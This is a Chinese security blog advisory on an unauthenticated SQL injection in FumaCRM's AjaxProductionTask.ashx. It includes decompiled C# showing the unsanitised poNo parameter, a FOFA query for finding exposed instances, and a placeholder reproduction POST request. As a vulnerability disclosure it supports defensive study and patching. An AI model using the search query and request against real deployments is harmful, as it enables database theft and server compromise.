---
title: "孚盟云CRM AjaxProductionTask.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxProductionTask-sqli.html
asset_dir: assets/孚盟云crm-ajaxproductiontask.ashx-sql注入漏洞
---

# 孚盟云CRM AjaxProductionTask.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/24 08:31
* 235浏览
* [0评论](#comment)
* 23分钟阅读

深入探索

安全运维咨询

安全研究工具

编程语言教程


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxProductionTask.ashx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `AjaxProductionTask.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxProductionTask** 方法的实现如下

```
public void ProcessRequest(HttpContext context)
{
  context.Response.ContentType = "text/plain";
  string empID = string.Empty;
  if (UserCookie.GetCookieValue("empId") != null)
    empID = FumaCRM_BS.Utility.Encrypt.Encrypt.DesDecrypt(UserCookie.GetCookieValue("empId"));
  try
  {
    string str = context.Request["method"].ToString();
    if (!string.op_Equality(str, "getProductionVaule"))
    {
      if (!string.op_Equality(str, "saveProductionVaule"))
      {
        if (!string.op_Equality(str, "getProductionList"))
          return;
        this.getProductionList(context, empID);
      }
      else
        this.saveProductionVaule(context, empID);
    }
    else
      this.getProductionVaule(context, empID);
  }
```

深入探索

文件大小转换

企业安全咨询

技术文章订阅

当**method=getProductionVaule**时，进入`getProductionVaule`方法

```
private void getProductionVaule(HttpContext context, string empID)
{
  string str1 = "";
  string str2 = context.Request["poNo"] == null ? "" : context.Request["poNo"].ToString();
  if (!string.IsNullOrEmpty(UserCookie.GetCookieValue("empId")))
  {
    empID = UserCookie.GetCookieValue("empId");
    empID = FumaCRM_BS.Utility.Encrypt.Encrypt.DesDecrypt(empID);
    if (!string.IsNullOrEmpty(str2))
    {
      string SQLString = $"SELECT TOP 1 A.FID,A.FactDate,A.Remark,B.gwmc, CASE WHEN EXISTS(SELECT TOP 1 1 FROM FM_TB27 P(nolock) JOIN syRoleDtl R(nolock) ON P.Rolemst = R.MstID WHERE P.MFID = B.FID AND R.EmpID = '{empID}') THEN '1' ELSE '0' END SaveRight from poModalTrack A (nolock) JOIN FM_TB26 B (nolock)ON A.ModalDtlFID = B.FID where A.PoNo = '{str2}' AND A.FactDate IS NULL ORDER BY B.OrderNo";
      DataSet dataSet = new DbHelperSql(UserCookie.GetCookieValue("corpId")).Query(SQLString);
```

参数**poNo**被直接拼接进SQL语句中执行，期间无过滤或校验，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

**getProductionList**与**saveProductionVaule**存在同样的直接拼接导致的SQL注入漏洞。

代码安全审计

[![孚盟云CRM AjaxProductionTask.ashx SQL注入漏洞](images/img-001-14ac7c6aae3b.webp)](https://image.mrxn.net/62082b208c964400b70f587956025f80.webp)

[![孚盟云CRM AjaxProductionTask.ashx SQL注入漏洞](images/img-002-3317aef80e6f.webp)](https://image.mrxn.net/f456c106e2a94b3ab848eeca3d32702e.webp)

# 漏洞复现

```
POST /m/Dingding/Ajax/AjaxProductionTask.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"empId":"1","corpId": "1"}
Content-Type: application/x-www-form-urlencoded

method=getProductionList&poNo='SQLI_POC--
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[孚盟云CRM AjaxProductionTask.ashx SQL注入漏洞](https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxProductionTask-sqli.html)  
文章链接：<https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxProductionTask-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞扫描服务

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxProductionTask-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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